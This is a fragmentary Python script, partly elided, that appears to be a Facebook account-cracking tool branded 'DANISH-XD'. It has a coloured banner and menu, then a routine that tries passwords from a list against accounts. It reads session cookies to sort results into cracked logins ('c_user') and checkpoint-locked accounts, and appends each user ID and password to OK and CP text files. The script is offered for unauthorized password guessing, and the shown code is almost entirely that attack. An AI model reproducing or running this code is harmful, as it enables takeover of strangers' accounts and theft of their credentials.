...
\033[1;33m$$ |  $$ |$$ |  $$ |$$ |\$$$ |  $$ |  $$\   $$ |$$ |  $$ |
\033[1;34m$$$$$$$  |$$ |  $$ |$$ | \$$ |$$$$$$\ \$$$$$$  |$$ |  $$ |
\033[1;35m\_______/ \__|  \__|\__|  \__|\______| \______/ \__|  \__|
...
def DANISH():
	...
	print('\33[1;37m----------------------------------------------')
	DANISH1 = input('[•] Select option  : ')
	if DANISH1 =='1':
		os.system('xdg-open https://www.facebook.com/groups/137415285764109/?ref=share_group_link')
		annu()
	if DANISH1 =='5':
		DANISH()
	if DANISH1 =='3':
	...
	if DANISH1 =='4':
		os.system('xdg-open https://www.facebook.com/groups/137415285764109/?ref=share_group_link');DANISH()
	if DANISH1 =='2':
		bangla()
	else:
...
def m1():
    ...
    print('Press Enter to Back');DANISH()
#
def m2():
    user=[]
    os.system('clear')
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                uid = coki[151:166]
                print('\033[1;32m[DANISH-XD-OK] '+uid+'|'+ps+'\033[0;97m')
                open('DANISH-XD-OK.txt', 'a').write(uid+' | '+ps+ '\n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[141:152]
                print('\033[1;31m[DANISH-XD-CP] '+uid+' | '+ps+'\x1b[1;97m')
                open('DANISH-XD-CP.txt', 'a').write(uid+' | '+ps+'\n')
                cps.append(uid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r[\033[1;97mDANISH-XD\033[1;97m] %s|\33[1;32mOK:- %s \r'%(loop,len(oks))),
        sys.stdout.flush()
    except:
        pass
